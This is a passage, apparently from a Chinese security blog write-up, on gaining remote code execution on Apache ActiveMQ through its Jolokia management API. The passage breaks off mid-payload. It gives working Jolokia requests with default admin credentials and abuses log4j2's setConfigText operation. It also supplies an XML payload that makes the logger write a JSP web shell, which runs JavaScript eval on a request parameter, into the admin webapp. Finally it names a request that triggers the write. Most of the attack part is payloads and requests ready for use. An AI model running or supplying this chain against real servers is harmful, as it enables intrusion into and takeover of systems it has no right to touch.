exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;Level&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;StatusData&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.util.List&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;ObjectName&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;javax.management.ObjectName&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;ContextName&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;class&quot;</span>: <span class="string">&quot;org.apache.logging.log4j.core.jmx.StatusLoggerAdmin&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Information on the management interface of the MBean&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;component=Loggers,name=,type=63a65a25&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;attr&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;Additive&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;boolean&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;Filter&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;AppenderRefs&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;[Ljava.lang.String;&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;IncludeLocation&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;boolean&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;Level&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;Name&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;class&quot;</span>: <span class="string">&quot;org.apache.logging.log4j.core.jmx.LoggerConfigAdmin&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Information on the management interface of the MBean&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;type=63a65a25&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;op&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;setConfigText&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;args&quot;</span>: [&#123;</span><br><span class="line"><span class="attr">&quot;name&quot;</span>: <span class="string">&quot;p1&quot;</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line"><span class="attr">&quot;name&quot;</span>: <span class="string">&quot;p2&quot;</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;],</span><br><span class="line"><span class="attr">&quot;ret&quot;</span>: <span class="string">&quot;void&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Operation exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;getConfigText&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;args&quot;</span>: [&#123;</span><br><span class="line"><span class="attr">&quot;name&quot;</span>: <span class="string">&quot;p1&quot;</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;],</span><br><span class="line"><span class="attr">&quot;ret&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Operation exposed for management&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;attr&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;Status&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;ConfigClassName&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;ConfigLocationUri&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;ConfigName&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;ConfigProperties&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.util.Map&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;ConfigText&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;Name&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;ObjectName&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;javax.management.ObjectName&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;ConfigFilter&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;class&quot;</span>: <span class="string">&quot;org.apache.logging.log4j.core.jmx.LoggerContextAdmin&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Information on the management interface of the MBean&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;component=ContextSelector,type=63a65a25&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;attr&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;ImplementationClassName&quot;</span>: &#123;</span><br><span class="line"><span class="attr">&quot;rw&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Attribute exposed for management&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">&quot;class&quot;</span>: <span class="string">&quot;org.apache.logging.log4j.core.jmx.ContextSelectorAdmin&quot;</span>,</span><br><span class="line"><span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;Information on the management interface of the MBean&quot;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>在这里可以看到两个比较可疑的操作<code>setConfigText</code>与<code>getConfigText</code>,看起来似乎与配置相关</p><p>看看代码可以发现，确实根据我们传入的字符串做了配置文件解析更新</p><p><img src="/2023/11/30/year/2023/11/%E6%9F%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E5%89%8D%E5%8F%B0RCE%E5%88%86%E6%9E%90/Apache-ActiveMQ-Jolokia%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8D%E4%BE%9D%E8%B5%96JDK%E6%89%93%E6%B3%95/image-20231130203410738.png" alt="image-20231130203410738"></p><p>同时<code>getConfigText</code>可以查看当前环境下的配置，可以看到返回的形式就和文件<code>/conf/log4j2.properties</code>一致</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /api/jolokia/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8161</span></span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">115.0</span><span class="number">.5790</span><span class="number">.171</span> Safari/<span class="number">537.36</span></span><br><span class="line">Origin: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: <span class="number">2174</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line"> <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;org.apache.logging.log4j2:type=63a65a25&quot;</span>,</span><br><span class="line"> <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;getConfigText&quot;</span>,</span><br><span class="line"> <span class="string">&quot;arguments&quot;</span>:[<span class="string">&quot;UTF-8&quot;</span>]</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">response:</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;request&quot;</span>:&#123;<span class="string">&quot;mbean&quot;</span>:<span class="string">&quot;org.apache.logging.log4j2:type=63a65a25&quot;</span>,<span class="string">&quot;arguments&quot;</span>:[<span class="string">&quot;UTF-8&quot;</span>],<span class="string">&quot;type&quot;</span>:<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;operation&quot;</span>:<span class="string">&quot;getConfigText&quot;</span>&#125;,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;rootLogger.level=INFO\nrootLogger.appenderRef.console.ref=Console\nrootLogger.appenderRef.console.filter.threshold.type=ThresholdFilter\nrootLogger.appenderRef.console.filter.threshold.level=INFO\nrootLogger.appenderRef.logfile.ref=RollingFile\nlogger.spring.name=org.apache.activemq.spring\nlogger.spring.level=WARN\nlogger.web.name=org.apache.activemq.web.handler\nlogger.web.level=WARN\nlogger.springframework.name=org.springframework\nlogger.springframework.level=WARN\nlogger.xbean.name=org.apache.xbean\nlogger.xbean.level=WARN\n\n# Jetty\nlogger.jetty.name=org.eclipse.jetty\nlogger.jetty.level=WARN\n\n# ActiveMQ\n#log4j2.logger.activemq.name=org.apache.activemq\n#log4j2.logger.activemq.level=DEBUG\n\n# Appender configuration\n\n# Console appender\nappender.console.type=Console\nappender.console.name=Console\nappender.console.layout.type=PatternLayout\nappender.console.layout.pattern=%5p | %m%n\n\n# File appender\nappender.logfile.type=RollingRandomAccessFile\nappender.logfile.name=RollingFile\nappender.logfile.fileName=$&#123;sys:activemq.data&#125;\/activemq2.log\nappender.logfile.filePattern=$&#123;sys:activemq.data&#125;\/activemq2.log.%i\nappender.logfile.append=true\nappender.logfile.layout.type=PatternLayout\nappender.logfile.layout.pattern=%d | %-5p | %m | %c | %t%n%throwable&#123;full&#125;\nappender.logfile.policies.type=Policies\nappender.logfile.policies.size.type=SizeBasedTriggeringPolicy\nappender.logfile.policies.size.size=1MB\n\n\nlogger.audit.name=org.apache.activemq.audit\nlogger.audit.additivity=false\nlogger.audit.level=INFO\nlogger.audit.appenderRef.auditlog.ref=AuditLog\n\nappender.auditlog.type=RollingRandomAccessFile\nappender.auditlog.name=AuditLog\nappender.auditlog.fileName=$&#123;sys:activemq.data&#125;\/audit.log\nappender.auditlog.filePattern=$&#123;sys:activemq.data&#125;\/audit.log.%i\nappender.auditlog.append=true\nappender.auditlog.layout.type=PatternLayout\nappender.auditlog.layout.pattern=%-5p | %m | %t%n\nappender.auditlog.policies.type=Policies\nappender.auditlog.policies.size.type=SizeBasedTriggeringPolicy\nappender.auditlog.policies.size.size=1MB\n&quot;</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="number">1701347796</span>,<span class="string">&quot;status&quot;</span>:<span class="number">200</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>但是当我们按照这个格式改好payload调用set更新时发现并没有成功，无事发生</p><p>调试后才发现这个config解析其实是xml形式的，算是被系统坑了一把</p><p><img src="/2023/11/30/year/2023/11/%E6%9F%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E5%89%8D%E5%8F%B0RCE%E5%88%86%E6%9E%90/Apache-ActiveMQ-Jolokia%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8D%E4%BE%9D%E8%B5%96JDK%E6%89%93%E6%B3%95/image-20231130204226465.png" alt="image-20231130204226465"></p><p>调用栈(方便也想调试看看的师傅)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">setConfiguration:<span class="number">601</span>, LoggerContext (org.apache.logging.log4j.core)</span><br><span class="line">start:<span class="number">285</span>, LoggerContext (org.apache.logging.log4j.core)</span><br><span class="line">setConfigText:<span class="number">201</span>, LoggerContextAdmin (org.apache.logging.log4j.core.jmx)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:<span class="number">566</span>, Method (java.lang.reflect)</span><br><span class="line">invoke:<span class="number">71</span>, Trampoline (sun.reflect.misc)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:<span class="number">566</span>, Method (java.lang.reflect)</span><br><span class="line">invoke:<span class="number">260</span>, MethodUtil (sun.reflect.misc)</span><br><span class="line">invokeM2:<span class="number">112</span>, StandardMBeanIntrospector (com.sun.jmx.mbeanserver)</span><br><span class="line">invokeM2:<span class="number">46</span>, StandardMBeanIntrospector (com.sun.jmx.mbeanserver)</span><br><span class="line">invokeM:<span class="number">237</span>, MBeanIntrospector (com.sun.jmx.mbeanserver)</span><br><span class="line">invoke:<span class="number">138</span>, PerInterface (com.sun.jmx.mbeanserver)</span><br><span class="line">invoke:<span class="number">252</span>, MBeanSupport (com.sun.jmx.mbeanserver)</span><br><span class="line">invoke:<span class="number">809</span>, DefaultMBeanServerInterceptor (com.sun.jmx.interceptor)</span><br><span class="line">invoke:<span class="number">801</span>, JmxMBeanServer (com.sun.jmx.mbeanserver)</span><br></pre></td></tr></table></figure><h2 id="破局"><a href="#破局" class="headerlink" title="破局"></a>破局</h2><p>但是也知道我懒，这种格式转换的活我很烦，还好有chatGPT，简单问了一手解决了我的问题</p><p>毕竟我不关心内容只需要一个模板罢了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">把接下来我给的配置转化为log4j2配置的xml的形式</span><br><span class="line">好的喵</span><br><span class="line">xxxx</span><br><span class="line">以下是将您提供的配置转换为log4j2的XML形式：</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">File</span> <span class="attr">name</span>=<span class="string">&quot;File&quot;</span> <span class="attr">fileName</span>=<span class="string">&quot;logs/logfile.log&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">File</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;debug&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;File&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>虽然不知道绝对路径，但是根据系统的原配置文件的写法<code>appender.logfile.fileName=$&#123;sys:activemq.data&#125;/activemq.log</code>再结合日志路径可以猜到使用<code>$&#123;sys:activemq.data&#125;/../webapps/admin/</code></p><p>同时为了方便利用，我写成el表达式的形式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">RollingRandomAccessFile</span> <span class="attr">name</span>=<span class="string">&quot;RollingFile&quot;</span> <span class="attr">fileName</span>=<span class="string">&quot;$&#123;sys:activemq.data&#125;/../webapps/admin/y4test.jsp&quot;</span></span></span><br><span class="line"><span class="tag">                                 <span class="attr">filePattern</span>=<span class="string">&quot;$&#123;sys:activemq.data&#125;/../webapps/admin/y4test.jsp&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;$&#123;&#x27;&#x27;[&#x27;getClass&#x27;]()[&#x27;forName&#x27;](&#x27;javax.script.ScriptEngineManager&#x27;)[&#x27;newInstance&#x27;]()[&#x27;getEngineByName&#x27;](&#x27;JavaScript&#x27;)[&#x27;eval&#x27;](param.a)&#125;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Policies</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">SizeBasedTriggeringPolicy</span> <span class="attr">size</span>=<span class="string">&quot;1MB&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Policies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">RollingRandomAccessFile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;RollingFile&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>打一发看看，但是目录下只生成了文件并没有把payload写入，因此我们需要找一个能触发日志的功能点</p><p>这里我随便找了一个<code>/admin/deleteDestination.action</code></p><p>看到这个心满意足</p><p><img src="/2023/11/30/year/2023/11/%E6%9F%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E5%89%8D%E5%8F%B0RCE%E5%88%86%E6%9E%90/Apache-ActiveMQ-Jolokia%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8D%E4%BE%9D%E8%B5%96JDK%E6%89%93%E6%B3%95/image.png" alt="image"></p><p>但是忘了一点，这里虽然输出了payload，也能利用了但是对于我们极客来说，不喜欢除了payload的其他字符</p><p><img src="/2023/11/30/year/2023/11/%E6%9F%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E5%89%8D%E5%8F%B0RCE%E5%88%86%E6%9E%90/Apache-ActiveMQ-Jolokia%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8D%E4%BE%9D%E8%B5%96JDK%E6%89%93%E6%B3%95/image-1349924.png" alt="image"></p><p>能做到吗？当然可以，通过查阅手册可以发现针对堆栈信息，有下面配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%throwable&#123;full&#125;：输出完整的异常堆栈信息</span><br><span class="line">%ex&#123;none&#125;来禁用异常堆栈的输出</span><br><span class="line">%ex&#123;short&#125;：输出简短的异常堆栈信息，只包括异常类和消息。</span><br><span class="line">%ex&#123;full&#125;：输出完整的异常堆栈信息，包括异常类、消息和详细的堆栈跟踪。</span><br></pre></td></tr></table></figure><p>那么必然是选<code>%ex&#123;none&#125;</code>，得到如下payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span 